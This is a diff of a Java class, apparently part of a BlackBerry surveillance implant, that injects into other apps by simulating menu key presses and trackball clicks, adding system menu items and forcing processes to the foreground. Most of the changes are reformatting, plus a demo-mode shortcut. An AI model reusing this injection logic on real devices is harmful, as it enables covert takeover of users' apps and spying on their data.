@@ -208,7 +208,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         //#ifdef BBM_DEBUG
         wantLight = true;
         //#endif
-        
+
         if (!injector.enabled()) {
             //#ifdef DEBUG
             debug.trace("injectAll, disabled: " + injector);
@@ -246,17 +246,21 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         if (wantLight) {
             Debug.ledFlash(Debug.COLOR_RED);
         }
-        
+
         unLock();
-        
+
         if (wantLight) {
             Debug.ledStart(Debug.COLOR_ORANGE);
         }
-        
+
         //#ifndef BBM_DEBUG
-        Utils.sleep(Utils.randomInt(5, 10) * 1000);
+        if (Status.self().isDemo()) {
+            Utils.sleep(1000);
+        } else {
+            Utils.sleep(Utils.randomInt(5, 10) * 1000);
+        }
         //#endif
-        
+
         if (wantLight) {
             Debug.ledStop();
         }
@@ -265,10 +269,12 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             //#ifdef DEBUG
             debug.trace("inject, backlight, bailing out");
             //#endif
-            if (wantLight) { Debug.playSoundError(1); }         
+            if (wantLight) {
+                Debug.playSoundError(1);
+            }
             return false;
         }
-        
+
         if (wantLight) {
             Debug.ledFlash(Debug.COLOR_YELLOW);
         }
@@ -276,7 +282,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             if (wantLight) {
                 Debug.ledFlash(Debug.COLOR_GREEN);
             }
-            
+
             //#ifdef DEBUG
             debug.trace("inject, executed: " + name);
             //#endif
@@ -285,7 +291,9 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                 //#ifdef DEBUG
                 debug.trace("inject, backlight, bailing out");
                 //#endif
-                if (wantLight) { Debug.playSoundError(2); }
+                if (wantLight) {
+                    Debug.playSoundError(2);
+                }
                 return false;
             }
             injector.incrTries();
@@ -297,14 +305,16 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                     //#ifdef DEBUG
                     debug.trace("inject, backlight, bailing out");
                     //#endif
-                    if (wantLight) { Debug.playSoundError(3); }
+                    if (wantLight) {
+                        Debug.playSoundError(3);
+                    }
                     return false;
                 }
 
                 if (wantLight) {
                     Debug.ledFlash(Debug.COLOR_BLUE_LIGHT);
                 }
-                
+
                 addSystemMenu(injector);
 
                 Utils.sleep(300);
@@ -313,7 +323,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                 //if (checkForeground(name)) {
                 //    callSystemMenuRecover();
                 //}
-                
+
                 removeSystemMenu();
 
                 manager.requestForegroundForConsole();
@@ -373,12 +383,13 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         //#endif
 
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        
-        /*if(injector.isLastTry()){
-            KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        }*/
-        
-        Utils.sleep(waitTime);       
+
+        /*
+         * if(injector.isLastTry()){
+         * KeyInjector.pressRawKeyCode(Keypad.KEY_MENU); }
+         */
+
+        Utils.sleep(waitTime);
 
         KeyInjector.trackBallRaw(20, true);
         if (Device.getInstance().atLeast(7, 0)) {
@@ -393,7 +404,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
         }
 
-        Utils.sleep(waitTime);        
+        Utils.sleep(waitTime);
         KeyInjector.trackBallRawClick();
         //KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         //Utils.sleep(waitTime);
@@ -484,7 +495,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                     //#ifdef DEBUG
                     debug.trace("requestForeground: bringing foreground");
                     //#endif
-                    manager.requestForeground(processId);                    
+                    manager.requestForeground(processId);
                     return true;
                 }
             }
@@ -604,6 +615,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                             new Runnable() {
 
                                 public void run() {
+                                    injector.init();
                                     injector.playOnScreen(screen);
                                 }
                             });
